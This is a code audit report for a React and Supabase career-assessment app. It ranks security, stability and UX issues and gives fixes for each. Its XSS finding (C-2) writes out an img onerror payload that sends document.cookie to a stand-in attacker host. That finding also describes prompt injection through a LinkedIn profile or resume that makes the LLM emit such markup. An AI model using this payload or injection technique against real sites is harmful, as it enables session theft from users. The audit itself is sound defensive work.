# Job Fortress / JobBachao — Full System Audit Report
**Date:** 2026-03-15 | **Auditor:** Systems Architect + QA Lead
**Stack:** React 18 + TypeScript + Vite + TailwindCSS + Supabase (Auth, DB, Edge Functions)
**Verdict:** Strong core intelligence, but carrying significant security debt, a ghost codebase contamination, and architectural fragility that must be addressed before scaling.

---

## SEVERITY LEGEND
| Level | Meaning |
|---|---|
| 🔴 CRITICAL | Exploitable now or data loss risk. Fix before next deploy. |
| 🟠 HIGH | Material security or stability risk. Fix this sprint. |
| 🟡 MEDIUM | Reliability or UX degradation. Fix next sprint. |
| 🔵 LOW | Code quality, tech debt, or minor UX. Backlog. |

---

## SECTION 1 — CRITICAL (Fix Before Next Deploy)

---

### 🔴 C-1: Ghost Codebase Contamination — Two Products in One Repo

**Files affected:** `src/contexts/AppContext.tsx`, `src/pages/Dashboard.tsx`, `src/pages/Report.tsx`, `src/pages/BlueprintReport.tsx`, `src/pages/FutureBlueprint.tsx`, `src/pages/CognitiveAssessment.tsx`, `src/pages/PhysicalAssessment.tsx`, `src/pages/NutritionAssessment.tsx`, `src/pages/WellbeingScreener.tsx`, `src/pages/Admin.tsx`, `src/pages/Register.tsx`, `src/pages/Onboarding.tsx`, `src/pages/AssessmentHub.tsx`, `src/pages/InterventionTracker.tsx`, `src/pages/ActionPlan.tsx`, `src/pages/InvestorDeck.tsx`, `src/pages/ParentSummaryCard.tsx`, `src/pages/SharedReport.tsx`, `src/pages/DevReset.tsx`, `src/pages/SampleBlueprint.tsx`, `src/pages/report/` (entire directory), and multiple component files including `src/components/QuickAddChildModal.tsx`, `src/components/FeedbackWidget.tsx`, `src/components/PrintablePDF.tsx`, `src/components/HeroBlueprintCard.tsx`.

**What happened:** A completely separate children's health/wellness assessment application ("BrainBridge" or similar) has been merged into this repository. These files reference `AppContext`, `ChildProfile`, `IntelligenceReport`, `wellbeing`, `cognitive`, `nutrition`, `bb_child*` localStorage keys — none of which belong to JobBachao.

**Impact:**
- **Build bloat:** ~20,000+ lines of dead code that compile on every build, inflating bundle size and build time.
- **TypeScript confusion:** The `AppContext.tsx` uses a custom hash-based routing system (`window.location.hash`) that conflicts directly with the React Router v6 `BrowserRouter` in `App.tsx`. This means two routing systems exist in the same codebase.
- **Database collision:** The first migration (`20260220032553`) creates `public.assessments` with fields `user_id`, `type` (children's app schema). A later migration (`20260225124047`) also creates `public.assessments` with fields `session_id`, `industry` (JobBachao schema). These are the same table name for two entirely different data models.
- **Test pollution:** `src/test/alg01-wellbeing-gate.test.ts` tests the children's app, not JobBachao.
- **Deployment risk:** Any import resolution error in these orphaned files can fail the entire build.

**Fix:** Audit and delete all files belonging to the other project. Confirm the `assessments` table migration conflict and resolve it. Estimated ~30 files to remove.

---

### 🔴 C-2: XSS via Unsanitized LLM Output in `dangerouslySetInnerHTML`

**File:** `src/components/dashboard/CareerGenomeDebate.tsx`

**Issue:** LLM-generated debate content is rendered directly into the DOM using `dangerouslySetInnerHTML` with only a regex-based markdown-to-HTML conversion (`replace(/\*\*(.*?)\*\*/g, '<strong>...')`). There is no HTML sanitization library (e.g., DOMPurify) applied.

```tsx
// VULNERABLE — LLM output piped directly to innerHTML
<p dangerouslySetInnerHTML={{
  __html: trimmed.replace(/\*\*(.*?)\*\*/g, '<strong class="...">$1</strong>')
}} />
```

**Attack scenario:** Prompt injection through the user's LinkedIn profile or resume could cause the LLM to include `<script>` tags or `<img onerror="...">` payloads. The regex replacement does not strip HTML tags — it only adds bold/italic. A malicious actor who knows the system prompt structure could craft a profile that produces `<img src=x onerror="document.location='https://attacker.com?t='+document.cookie">` in the LLM output, which would execute in the user's browser.

**Same issue in:** `src/pages/report/ParentWhatToDoTab.tsx`, `src/pages/BlueprintReport.tsx` (ghost files, but demonstrates the pattern).

**Fix:**
```bash
npm install dompurify @types/dompurify
```
```tsx
import DOMPurify from 'dompurify';
// Before every dangerouslySetInnerHTML usage:
__html: DOMPurify.sanitize(rawHtml, { ALLOWED_TAGS: ['strong','em','br'], ALLOWED_ATTR: ['class'] })
```

---

### 🔴 C-3: Admin Dashboard Has No Role Verification on the Frontend

**File:** `src/pages/AdminDashboard.tsx`, `src/App.tsx`

**Issue:** The `/admin/monitor` route is wrapped in `AuthGuard` which only confirms the user is **authenticated** — it does not check if they have admin role. Any registered user who knows the URL can access the admin dashboard UI. The role check (`result?.error === 'Forbidden'`) only happens after the `admin-dashboard` edge function is called, meaning:

1. Any logged-in user navigating to `/admin/monitor` sees the full admin UI skeleton before the API returns Forbidden.
2. If the edge function ever has a bug or returns partial data before the role check, real user data (emails, scan details, cost metrics) could be exposed.

**Fix:** Add an explicit admin role check before rendering anything:
```tsx
// In AdminDashboard.tsx, add a pre-check
const { data: profile } = await supabase.from('profiles').select('role').eq('id', user.id).single();
if (profile?.role !== 'admin') { navigate('/'); return; }
```
Also: add an `admin` role to the `user_roles` table and check it in `AuthGuard` for the admin route.

---

### 🔴 C-4: `.env` File Is Present in the Repository

**File:** `.env`

**Content found:**
```
VITE_SUPABASE_PROJECT_ID="dcgijelxmertjpzskdrc"
VITE_SUPABASE_PUBLISHABLE_KEY="eyJhbGci..."
VITE_SUPABASE_URL="https://dcgijelxmertjpzskdrc.supabase.co"
```

**Issue:** The `.env` file was found in the uploaded zip, meaning it exists in the project directory. While `.gitignore` includes `.env`, the file was clearly committed at some point (or is at risk). The publishable/anon key is not a secret per se — it's designed to be public — however the **project ID** and **URL** allow anyone to identify your Supabase project and attempt to exploit any misconfigured RLS policy.

**Fix:**
- Verify this file is not in git history: `git log --all --full-history -- .env`
- If committed, rotate the anon key in Supabase dashboard.
- Rename to `.env.local` and update `.gitignore` to explicitly cover `.env.local`.
- Add an `.env.example` with placeholder values for onboarding.

---

## SECTION 2 — HIGH PRIORITY (Fix This Sprint)

---

### 🟠 H-1: Premium Gate Is Entirely Client-Side

**File:** `src/components/PremiumGate.tsx`, `src/hooks/use-subscription.ts`

**Issue:** `PremiumGate` reads subscription tier from the Supabase `profiles` table via the client SDK. While the actual premium feature *content* is not rendered (it returns a lock screen), the edge functions that power those features (e.g., `ai-dossier`, `career-obituary`) are called directly from the frontend with the anon key. There is no server-side check in these edge functions to verify the user has an active Pro subscription before executing.

**Result:** A user could call the edge functions directly via `curl` or a browser devtools fetch call and receive Pro content without a subscription.

**Fix:** In each premium edge function, add a subscription check:
```typescript
const { data: profile } = await supabase.from('profiles').select('subscription_tier, subscription_expires_at').eq('id', user.id).single();
const isActive = profile?.subscription_tier !== 'free' && (!profile?.subscription_expires_at || new Date(profile.subscription_expires_at) > new Date());
if (!isActive) return new Response(JSON.stringify({ error: 'Pro subscription required' }), { status: 402 });
```

---

### 🟠 H-2: `assessments` Table Migration Conflict

**Files:** `supabase/migrations/20260220032553_*.sql` vs `supabase/migrations/20260225124047_*.sql`

**Issue:** The first migration creates `public.assessments` for the children's health app with schema `(id, user_id, child_id, type, answers, score, ...)`. The second migration (3 days later) also attempts to `CREATE TABLE public.assessments` for the career app with schema `(id, session_id, industry, metro_tier, ...)`.

In a fresh Supabase project, the second migration will fail silently or the table will have the wrong schema. The RLS policies from both migrations will conflict, leaving the table in an inconsistent state.

**Fix:** Rename the career app's assessments table to `career_assessments` or `scan_assessments` in a new migration, and update all references. Resolve the conflict explicitly rather than relying on CREATE TABLE IF NOT EXISTS.

---

### 🟠 H-3: `subscribeScanStatus` — Realtime Channel Leaked on Component Unmount Race

**File:** `src/lib/scan-engine.ts`, `src/pages/Index.tsx`

**Issue:** The scan pipeline uses a `cleanupRef` to cancel the Realtime subscription. However, if the component unmounts (user navigates away) while the Realtime channel is connecting, the `cleanup()` function called in `useEffect` cleanup may fire *before* the channel is fully initialized. The channel `.unsubscribe()` called on a partially-initialized channel can silently fail, leaving an active WebSocket listener that continues polling and writing to `setScanReport` on an unmounted component.

```tsx
// In Index.tsx — the cleanup might not reach the channel
useEffect(() => {
  return () => { cleanupRef.current?.(); };
}, []);
```

**Secondary issue:** The polling fallback (`startPolling`) runs in parallel with Realtime, but there's no guarantee both don't fire `resolve()` simultaneously. While `resolved` flag prevents double-resolution, the React state updates from both paths can still race.

**Fix:** Use an `AbortController` for the polling and wrap `setScanReport` calls with an `isMounted` ref check. Consider migrating to React Query's `useQuery` for automatic cleanup and deduplication.

---

### 🟠 H-4: No Loading State Guard on `AdvancedBeta.tsx` Double Submit

**File:** `src/pages/AdvancedBeta.tsx`

**Issue:** `handleSubmit` is called from `RiskIQForm` and immediately sets `phase("analyzing")`, but there is no mutex or disabled state applied to the form submit button before `setPhase` is called. If the user clicks submit twice rapidly (mobile double-tap), two concurrent `supabase.functions.invoke("riskiq-analyse")` calls are made. Each will count toward rate limiting and LLM cost.

The `useRequestMutex` hook exists in the main `Index.tsx` but was not carried over to `AdvancedBeta.tsx`.

**Fix:** Import and apply `useRequestMutex` in `AdvancedBeta.tsx` around the `handleSubmit` function.

---

### 🟠 H-5: `CareerGenomeDebate` Has No Abort on Unmount

**File:** `src/components/dashboard/CareerGenomeDebate.tsx`

**Issue:** The debate feature starts a long-running streaming LLM call (potentially 30-60 seconds). If the user navigates to another tab before it completes, the streaming continues consuming bandwidth and calling `setDebate(...)` on an unmounted component, which logs React warnings and may cause subtle state corruption if the component remounts.

**Fix:** Add an `AbortController` ref and cancel on unmount, mirroring the pattern already used in `AdvancedBeta.tsx`'s `streamDossier`.

---

### 🟠 H-6: `ShareScan` Exposes Full Scan Report Without Auth Check

**File:** `src/pages/ShareScan.tsx`

**Issue:** The share page queries `public.scans` using only the scan ID (a UUID). The `scans` RLS policy allows "select own scans" for authenticated users — but the share page does NOT require authentication. If the Supabase `maybeSingle()` query returns data for an unauthenticated user (which it would if there's a permissive SELECT policy), `final_json_report` — which contains the user's LinkedIn name, skills, salary data, and company information — is exposed to anyone with the URL.

**Check needed:** Verify whether the current RLS on `scans` allows anonymous SELECT by scan ID. If yes, the share feature is leaking PII.

**Fix:** Either: (a) require auth to view shared scans, (b) create a separate `shared_scans` table with only public-safe fields, or (c) ensure shared scan links are one-time tokens with expiry.

---

## SECTION 3 — MEDIUM PRIORITY (Fix Next Sprint)

---

### 🟡 M-1: 328 Instances of TypeScript `any` — Type Safety Breakdown

**Issue:** The codebase has 328 uses of `: any` or `as any`. Key hotspots: `scan-engine.ts` (LLM response parsing), `InsightCards.tsx`, `AdvancedBeta.tsx`, `AdminDashboard.tsx`. The `ScanReport` type is well-defined but frequently bypassed with `as any` when accessing nested fields.

**Impact:** Runtime type errors that TypeScript would normally catch pass silently, and LLM response shape changes (which happen frequently) create invisible bugs.

**Fix:** Enable `"strict": true` in `tsconfig.app.json` if not already set, and progressively replace `any` with proper types. Priority: `scan-engine.ts` first, as it's the core data model.

---

### 🟡 M-2: `Index.tsx` — 12-Phase State Machine Is Fragile

**Issue:** The main flow uses 12 phases managed with `useState<AppPhase>`. There are 6 separate `useEffect` hooks watching `phase`, each applying guards or side effects. Phase transition logic is scattered across handlers (`handleStart`, `handleAuthConfirmed`, `handleProceedNewScan`, etc.) with no centralized transition validation.

**Specific fragility:** The guard `if (phase === 'insight-cards' && scanReport && !moneyShotSeen) { setPhase('money-shot'); }` can cause a render loop if `moneyShotSeen` is not updated atomically with the phase transition.

**Fix:** Use `useReducer` with an explicit state machine, or adopt a lightweight state machine library (`xstate` or `zustand`). Define allowed transitions explicitly to prevent invalid states.

---

### 🟡 M-3: Fake Testimonials and FOMO Toast Still Present

**Files:** `src/components/TechnologySection.tsx` (TESTIMONIALS array), potential `FomoToast.tsx`

**Issue:** Per the existing product audit (which correctly identifies this as the #1 trust risk), fabricated user testimonials are still in the codebase. This directly contradicts the "zero hallucination" brand promise and creates legal exposure under consumer protection laws in India, US, and UAE.

**Fix:** Replace with the anonymized scan summary format suggested in `MASTER_SPRINT_PLAN.md` (Sprint 0.1). Remove entirely if no real quotes are available yet.

---

### 🟡 M-4: `VerdictReveal.tsx` — Score Methodology Shown After, Not Before, the Score

**File:** `src/components/VerdictReveal.tsx`

**Issue:** The score decomposition waterfall (AI Resistance, Market Position, etc.) is shown after the dramatic score count-up animation. Users see a "47" on screen and emotionally react before understanding how it was calculated. This reduces trust and increases support queries from users who disagree with their score.

**Fix:** Per Sprint Plan 0.4–0.5: show a 3-second "methodology preview" card before the count-up begins — "Your score is computed from 5 factors" — then reveal the score, then show the decomposition. The infrastructure (`computeScoreBreakdown`) already exists.

---

### 🟡 M-5: `RiskIQAnalyzing` — Terminal Animation Disconnected from Real Progress

**File:** `src/components/riskiq/RiskIQAnalyzing.tsx`, `src/pages/AdvancedBeta.tsx`

**Issue:** Confirmed from the product audit: the terminal animation runs for ~9 seconds purely cosmetically, while the actual API call runs AFTER the animation completes. Users experience: watch animation → animation ends → wait silently for 10-30 seconds → results appear. This feels broken.

**Fix:** Start the API call in `handleSubmit` immediately, pass a `Promise` to `RiskIQAnalyzing`, and animate progress tied to actual response milestones (submitted → processing → scoring → done). The `MatrixLoading` component in the main app already does this correctly — replicate that pattern.

---

### 🟡 M-6: No Input Validation on LinkedIn URL

**Files:** `src/components/InputMethodStep.tsx`

**Issue:** LinkedIn URLs are passed directly to the `process-scan` edge function with minimal client-side validation. The edge function uses Firecrawl to scrape the URL — if a malicious URL is submitted (e.g., `javascript:`, an internal network address, or a redirect chain), it could cause SSRF (Server-Side Request Forgery) at the Firecrawl level.

**Fix:** Validate URL format and domain strictly before submission:
```tsx
const isValidLinkedIn = /^https:\/\/(www\.)?linkedin\.com\/in\/[a-zA-Z0-9\-_%]+\/?$/.test(url);
```
Also add this validation server-side in the edge function.

---

### 🟡 M-7: `ErrorBoundary` Clears Auth Tokens on Non-Auth Errors

**File:** `src/components/ErrorBoundary.tsx`

**Issue:** The `hardReset()` method removes all `sb-*` and `*-auth-token` keys from localStorage on any unhandled error, including non-auth errors like a render crash in a card component. This means a benign error (e.g., a null pointer in `InsightCards`) logs the user out and loses their scan state, requiring them to re-authenticate and re-run the scan.

**Fix:** Only clear auth tokens for auth-related errors. For other errors, preserve session and only reset `jb_pending_input` and the retry flags:
```tsx
const isAuthError = message?.includes('auth') || message?.includes('JWT') || message?.includes('session');
if (isAuthError) {
  // clear sb-* keys
}
// always clear app-specific keys
sessionStorage.removeItem('jb_pending_input');
```

---

### 🟡 M-8: `useSubscription` Fetches on Every Auth State Change

**File:** `src/hooks/use-subscription.ts`

**Issue:** The subscription hook re-fetches the user's subscription tier from `profiles` on every `onAuthStateChange` event, including `TOKEN_REFRESHED`. Supabase refreshes tokens every ~60 minutes, meaning a subscription DB query fires every hour even while the user is just reading their results. On a heavy traffic day this generates unnecessary database load.

**Fix:** Use React Query with a stale time:
```tsx
const { data: profile } = useQuery({
  queryKey: ['subscription', user?.id],
  queryFn: () => supabase.from('profiles').select('subscription_tier, subscription_expires_at').eq('id', user.id).single(),
  staleTime: 5 * 60 * 1000, // 5 minutes
  enabled: !!user,
});
```

---

## SECTION 4 — LOW PRIORITY / TECH DEBT

---

### 🔵 L-1: `scan-engine.ts` Subscribes Realtime Channel Without Exponential Backoff on Reconnect

The Realtime channel doesn't handle the `CHANNEL_ERROR` → reconnect cycle with backoff. If Supabase Realtime has a transient outage, the polling fallback correctly kicks in, but subsequent reconnect attempts to Realtime could create multiple overlapping channels.

---

### 🔵 L-2: `InsightCards.tsx` Card Array Built Inside Component Render

The `CORE_CARDS` and `DEEP_CARDS` arrays (and the conditional LinkedIn card) are constructed inside the component render function, creating a new array reference on every render. This causes any child components that use these arrays as dependencies in their own hooks to re-execute unnecessarily.

**Fix:** Move card definitions outside the component or wrap with `useMemo`.

---

### 🔵 L-3: `use-analytics.ts` Writes Viewport and URL to Database

Every analytics event writes `viewport: '1440x900'` and `url: '/share/abc123'` to `beta_events`. The URL can contain scan IDs, and the viewport can be used for fingerprinting. While low-risk today, GDPR/DPDP Act (India) compliance requires this to be disclosed in the privacy policy and minimized.

---

### 🔵 L-4: Dual Toast Systems (Toaster + Sonner)

**File:** `src/App.tsx`

Both `@radix-ui/react-toast` (via `<Toaster />`) and `sonner` (via `<Sonner />`) are imported and mounted simultaneously. This doubles the DOM overhead and creates inconsistent toast styling. Standardize on one library — `sonner` is the modern choice and already used in most places.

---

### 🔵 L-5: `QueryClient` Created Outside Component Without `useMemo`

**File:** `src/App.tsx`

```tsx
const queryClient = new QueryClient(); // Created at module level
```

This is technically fine but means the QueryClient is a singleton across the entire application lifetime, including hot-module-replacement in development. In production this is acceptable, but in development it causes cached data to persist across HMR refreshes, which can mask bugs. Move it inside the App component with `useMemo` or keep at module level with a comment.

---

### 🔵 L-6: Missing `key` Stability in Card Carousel

**File:** `src/components/InsightCards.tsx`

Cards use array index as key (`cards.map((c, i) => <... key={i}>`). When the card array changes (e.g., LinkedIn roast card is conditionally added/removed based on `report.source`), React uses incorrect reconciliation and may show the wrong card animation state.

**Fix:** Use `c.id` as the key, which is already defined in the card objects.

---

### 🔵 L-7: `window.location.reload()` in `lazyWithRetry` Can Cause Reload Loops

**File:** `src/pages/Index.tsx`

The `lazyWithRetry` function calls `window.location.reload()` and uses `sessionStorage` to prevent a second reload. However, if `sessionStorage` is unavailable (private browsing with strict settings, storage quota exceeded), the `hasRetried` check will always return `false` and the page will reload infinitely on any chunk error.

**Fix:** Wrap the entire `sessionStorage` read/write in a try/catch that defaults to `hasRetried = true` on any exception (already partially done but not consistently).

---

## SECTION 5 — ARCHITECTURE ASSESSMENT

### Overall Architecture Score: B-

**Strengths:**
- Clean separation of concern between scan engine, stability score calculation, and UI layers.
- `cleanupRef` pattern for Realtime subscription management is well-thought-out.
- `lazyWithRetry` for code splitting on heavy components is excellent.
- Dual-mode analysis (Realtime + polling fallback with exponential backoff) is production-grade.
- `useRequestMutex` preventing double-submit is the right approach.
- RLS is enabled on all tables — good baseline.
- Email queue infrastructure (pgmq + pg_cron) is well-architected.
- `role-guard.ts` LLM inflation protection is a thoughtful, unique solution.

**Weaknesses:**
- **Two products, one repo** — must be resolved immediately. (C-1)
- **No server-side premium gating** — subscriptions enforced only at the UI layer. (H-1)
- **State management anti-pattern** — 12-phase `useState` machine in `Index.tsx` should be a reducer or state machine library.
- **Type safety debt** — 328 `any` casts undermine TypeScript's value.
- **Two routing systems** — React Router v6 and `window.location.hash` coexist, causing deep confusion about which system governs navigation.

---

## SECTION 6 — PRIORITIZED ACTION PLAN

| Priority | Issue | Effort | Impact |
|---|---|---|---|
| 🔴 IMMEDIATE | C-1: Delete ghost codebase (other project files) | 2h | Build health, DX |
| 🔴 IMMEDIATE | C-2: Add DOMPurify to all `dangerouslySetInnerHTML` | 1h | Security |
| 🔴 IMMEDIATE | C-3: Add admin role check to `/admin/monitor` frontend | 2h | Security |
| 🔴 IMMEDIATE | C-4: Verify `.env` not in git history, rotate if needed | 30m | Security |
| 🟠 THIS SPRINT | H-1: Add server-side premium subscription check in edge functions | 3h | Revenue protection |
| 🟠 THIS SPRINT | H-2: Resolve `assessments` table migration conflict | 2h | Data integrity |
| 🟠 THIS SPRINT | H-3: Fix scan subscription cleanup race condition | 2h | Stability |
| 🟠 THIS SPRINT | H-4: Apply `useRequestMutex` to AdvancedBeta submit | 30m | Stability |
| 🟠 THIS SPRINT | H-5: Cancel CareerGenomeDebate stream on unmount | 1h | Memory/stability |
| 🟠 THIS SPRINT | H-6: Audit ShareScan RLS — verify no PII leak | 1h | Privacy |
| 🟡 NEXT SPRINT | M-1: Replace top-50 `any` instances in core files | 4h | Type safety |
| 🟡 NEXT SPRINT | M-2: Refactor Index.tsx to `useReducer` state machine | 4h | Maintainability |
| 🟡 NEXT SPRINT | M-3: Remove fake testimonials → replace with real reactions | 1h | Trust |
| 🟡 NEXT SPRINT | M-4: Show methodology BEFORE score in VerdictReveal | 2h | Trust/UX |
| 🟡 NEXT SPRINT | M-5: Fix RiskIQAnalyzing parallel API call | 2h | UX |
| 🟡 NEXT SPRINT | M-6: Add LinkedIn URL strict validation | 1h | Security |
| 🟡 NEXT SPRINT | M-7: Fix ErrorBoundary auth token wipe on non-auth errors | 1h | UX |
| 🟡 NEXT SPRINT | M-8: Cache subscription query with React Query staleTime | 1h | Performance |
| 🔵 BACKLOG | L-1 through L-7: Code quality and tech debt items | 8h total | Maintainability |

**Total estimated effort for Critical + High items: ~15 hours**
**Total estimated effort for Critical through Medium: ~35 hours**

---

*Generated by full static + migration audit. No live environment access was used.*
